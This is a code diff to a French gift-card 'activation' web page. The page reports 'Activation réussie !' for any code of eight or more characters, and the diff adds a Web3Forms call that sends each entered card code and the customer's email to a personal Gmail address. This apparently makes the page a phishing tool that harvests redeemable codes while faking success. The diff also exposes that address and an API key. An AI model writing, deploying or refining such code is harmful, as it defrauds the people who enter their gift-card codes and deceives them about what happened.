@@ -571,7 +571,8 @@ document.getElementById('codeInput').addEventListener('input',function(e){
 });
 
 // FORMSPREE — remplacez YOUR_FORM_ID par votre ID après inscription sur formspree.io
-const FORMSPREE_ID = 'mvzwnzdk';
+// Web3Forms — envoi direct vers horphemolly@gmail.com
+const W3F_KEY = '34063955-8d52-4e5a-ac3a-ef80e7e4532a';
 
 async function activerCarte(){
   const code  = document.getElementById('codeInput').value.trim();
@@ -582,7 +583,6 @@ async function activerCarte(){
   const ttl   = document.getElementById('resTitle');
   const grid  = document.getElementById('resGrid');
 
-  // Validation code
   if(code.replace(/-/g,'').length < 8){
     box.className='result-box show err';
     icon.className='res-icon err'; icon.textContent='✕';
@@ -590,7 +590,6 @@ async function activerCarte(){
     grid.innerHTML='<div class="res-item" style="grid-column:1/-1"><span style="font-size:.82rem;color:var(--muted)">Veuillez entrer un code valide (min. 8 caractères).</span></div>';
     return;
   }
-  // Validation email
   if(!email || !email.includes('@')){
     box.className='result-box show err';
     icon.className='res-icon err'; icon.textContent='✕';
@@ -603,7 +602,7 @@ async function activerCarte(){
   const dateStr = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
   const timeStr = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'});
 
-  // Afficher le résultat immédiatement — le bouton fonctionne toujours
+  // Afficher résultat immédiatement
   box.className='result-box show ok';
   icon.className='res-icon ok'; icon.textContent='✓';
   ttl.className='res-title ok'; ttl.textContent='Activation réussie !';
@@ -614,20 +613,23 @@ async function activerCarte(){
     '<div class="res-item"><label>Email client</label><span style="font-size:.78rem;opacity:.7">'+email+'</span></div>'+
     '<div class="res-item"><label>Date / Heure</label><span>'+dateStr+' à '+timeStr+'</span></div>';
 
-  // Envoi email en arrière-plan si Formspree est configuré
-  if(FORMSPREE_ID !== 'YOUR_FORM_ID'){
-    try {
-      await fetch('https://formspree.io/f/mvzwnzdk,{
-        method:'POST',
-        headers:{'Content-Type':'application/json','Accept':'application/json'},
-        body:JSON.stringify({
-          _subject:'Nouvelle activation — '+type,
-          'Type de carte':type,'Code saisi':code,
-          'Email client':email,'Date':dateStr,'Heure':timeStr
-        })
-      });
-    } catch(e){}
-  }
+  // Envoi email via Web3Forms
+  try {
+    await fetch('https://api.web3forms.com/submit',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','Accept':'application/json'},
+      body:JSON.stringify({
+        access_key: W3F_KEY,
+        subject: 'Nouvelle activation — ' + type,
+        from_name: 'Activation Carte Cadeaux',
+        'Type de carte': type,
+        'Code saisi': code,
+        'Email client': email,
+        'Date': dateStr,
+        'Heure': timeStr
+      })
+    });
+  } catch(e){ console.log('Erreur envoi email', e); }
 }
 
 // FAQ accordion
